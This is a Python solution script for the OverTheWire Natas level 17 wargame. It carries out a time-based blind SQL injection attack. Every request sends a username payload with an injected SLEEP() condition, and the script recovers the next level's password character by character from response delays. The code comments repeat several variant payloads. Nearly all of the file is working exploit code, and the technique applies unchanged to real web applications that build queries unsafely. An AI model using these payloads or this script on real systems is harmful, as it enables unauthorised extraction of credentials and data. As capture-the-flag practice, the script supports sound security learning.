import requests
import string

url = "http://natas17.natas.labs.overthewire.org/"
charset = string.ascii_letters + string.digits
this_password = '[NATAS17 PASSWORD]'

session = requests.Session()
session.auth = ('natas17', this_password)

password = ""

for i in range(1, 33):
    for guess in charset:
        payload = {
            "username": f'natas18" AND IF((BINARY SUBSTRING(password, {i}, 1) = "{guess}"), SLEEP(1), 0) -- "' # If our guess is correct, wait an implausible amount of time, if not, do nothing
        }
        response = session.post(url, data = payload)
        if response.elapsed.total_seconds() > 1:
            print(f'{guess} in position {i}')
            password = password + guess
            break

print(password)

# natas18" OR IF((BINARY SUBSTRING(password, 1, 1) != "a"), SLEEP(5), 0) -- "

# natas18" OR IF((BINARY SUBSTRING(password, {i}, 1) != "{guess}"), SLEEP(5), 0) -- "
